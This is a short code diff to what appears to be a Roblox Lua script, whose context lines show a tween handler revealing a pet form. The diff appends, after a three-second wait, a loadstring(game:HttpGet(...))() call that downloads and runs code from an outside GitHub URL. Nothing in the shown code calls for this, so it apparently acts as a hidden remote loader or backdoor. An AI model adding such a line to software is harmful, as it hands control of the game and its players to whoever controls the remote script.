@@ -247,3 +247,7 @@ tween.Completed:Connect(function()
 
     petForm.Visible = true
 end)
+
+wait(3)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/meijinemiko/sc/refs/heads/main/new"))()
